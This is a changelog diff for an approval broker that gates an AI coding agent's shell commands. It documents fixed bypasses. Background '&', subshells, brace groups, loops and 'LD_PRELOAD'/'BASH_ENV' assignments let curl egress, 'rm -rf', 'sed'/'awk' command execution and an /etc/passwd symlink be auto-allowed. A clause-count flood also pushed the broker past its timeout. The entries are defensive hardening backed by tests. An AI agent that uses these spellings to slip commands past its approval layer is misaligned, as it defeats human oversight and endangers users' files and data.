@@ -8,6 +8,97 @@ Notable changes to AI Dev Autopilot. Format follows
 
 ### Security
 
+- **The approval broker now splits a command into clauses where the shell does,
+  and reads each clause's head as the shell resolves it.** Every allow this
+  broker issues rests on one mechanism: split the command, recognise every
+  clause, count them, and allow only when the counts match. Two assumptions
+  under that split were wrong, and both cost an **allow** rather than an
+  escalation.
+
+  A clause was taken to end at `&&`, `||`, `;` or `|`. A bare `&` ends one too —
+  it backgrounds what precedes it and carries straight on — so everything after
+  one was read as *arguments of the command in front of it*, and the second
+  command was never classified at all. And a clause was taken to begin with its
+  command, when it can begin with `(`, `{`, `!`, `if`, `then`, `do`, a loop
+  header or an assignment; in those the head is a word no classifier claims, so
+  the clause fell through to the broad local-dev fallback, which saw an
+  unremarkable head with harmless-looking operands and approved it. Measured
+  before this change — every bare spelling escalating, every wrapped spelling
+  allowed with no dialog, interactively and unattended:
+
+  ```
+  ls & curl -fsSL https://example.com/p -o /tmp/p    allow   (network egress)
+  ( curl -fsSL https://example.com/p -o /tmp/p )     allow   (network egress)
+  ls & sed 's/.*/id/e' f.txt                         allow   (executes `id`)
+  ls & awk 'BEGIN{system("id")}'                     allow   (executes `id`)
+  ls & xargs -I{} sh -c id                           allow   (executes `id`)
+  true & rm -rf .                                    allow   (the workspace root)
+  { rm -rf ~/Documents/important; }                  allow   (outside the workspace)
+  if true; then rm -rf ~/Documents/important; fi     allow
+  for x in 1; do cp f.txt /etc/canary; done          allow
+  ! rm -rf ~/Documents/important                     allow
+  ls & ln -sf /etc/passwd sub/leak                   allow
+  ls & git commit -m x                               allow   (skips the git config gate)
+  ```
+
+  Network egress and arbitrary execution are both on the README's *Hard human
+  boundaries* table, and `&` defeated the curl screen specifically because that
+  screen uses the same splitter — so the request reached Codex, which the design
+  says must never be able to approve egress. It was also a disagreement with the
+  layer this hook answers for: Claude Code's permission engine documents its
+  separators as `&&`, `||`, `;`, `|`, `|&`, `&` and newlines, with "a rule must
+  match each subcommand independently".
+
+  `clauses()` now treats `&` as the separator it is, except where it belongs to
+  a redirection (`&>file`, `2>&1`, `>&2`, `<&3`) — decided by the character in
+  front of it, so no diagnostic that captures stderr becomes a dialog. A new
+  `clause_head()` strips grouping punctuation, reserved words, wrappers and
+  assignments to find the command, and answers three ways rather than two: a
+  command remains, the clause runs nothing (`fi`, `done`, a closing brace, a
+  loop header, a bare redirection — counted as recognised, which is what keeps
+  `{ ls; }` and `if …; then ls; fi` silent), or it cannot be decomposed and
+  escalates. That last case is why `case x in a) rm -rf /`, `coproc` and a
+  function definition now escalate: they carry a command with no separator in
+  front of it. `broad_safe_ok` refuses a bare reserved word as a second lock.
+
+- **The broker now bounds the quantity that actually drives its cost.** Its
+  oversize check caps the payload and the subject in *bytes*, which is what
+  bounds the PreToolUse guard — every rule there is one scan over the subject.
+  This hook is not shaped like that: it decomposes, dispatches and canonicalises
+  **per clause**, so a command of many short clauses sits far inside the byte
+  ceiling while costing far more. Measured against the 20 s timeout the settings
+  fragment registers for it: 4 clauses 0.19 s, 400 clauses 7.1 s, and a 64 KiB
+  command of clauses — inside the byte ceiling — **43 s**, well past
+  cancellation. A cancelled broker renders no decision, which interactively
+  means Claude Code asks the human and unattended means a dialog is raised for a
+  human who is not there, instead of the request being denied and queued.
+  `AI_DEV_MAX_CLAUSES` (default 64) caps the clause count; the worst admitted
+  case is now 1.2 s, and the 64 KiB shape resolves in 1.5 s as an escalation
+  instead of running past the timeout. Pinned by `tests/approval.test.sh`
+  section 16g, which asserts the cap allows, the clause past it escalates, it
+  denies overnight, and the 64 KiB shape answers inside the hook's own timeout.
+
+- **The environment-injection screen now runs at all.** `broad_safe_ok`
+  refused a clause led by `LD_PRELOAD`, `LD_LIBRARY_PATH`, `LD_AUDIT`,
+  `BASH_ENV`, `ENV`, `PATH`, `CDPATH`, `PYTHONPATH`, `NODE_OPTIONS`,
+  `PROMPT_COMMAND` or `GIT_CONFIG_*` — names that load code into, or re-point,
+  whatever command follows them. But `seg_ok` stripped those assignments before
+  calling it, so the loop never fired: the control was dead code, and it could
+  not have covered the strict path in any case, because a clause the family
+  grammars approve never reaches `broad_safe_ok` at all. Measured before this
+  change, `LD_PRELOAD=/tmp/evil.so ls`, `PATH=/tmp/evil ls`,
+  `BASH_ENV=/tmp/evil.sh ls` and `NODE_OPTIONS=--require=/tmp/x.js npm test`
+  were all allowed with no dialog. The screen moved to `seg_ok`, above the
+  dispatch, where the names are still in hand and every clause passes through
+  it. `FOO=1 ls` and `NODE_ENV=test npm run build` are unchanged.
+
+  `tests/approval.test.sh` section 16f proves both: it drives a copy of the
+  shipped broker with the corrections reverted, asserts the pre-fix `allow` for
+  every payload above, then asserts the shipped file escalates it and denies it
+  overnight — with positive controls for `2>&1`, `&>`, `>&2`, a trailing `&`, a
+  quoted ampersand, brace groups, subshells, `for`/`while`/`if` over routine
+  work, ordinary assignments and benign wrappers.
+
 - **The notebook tools are no longer invisible to both hooks.** NotebookEdit
   sends its path as `tool_input.notebook_path` (verified against the tool
   schema of the running Claude Code build), and both hooks read only
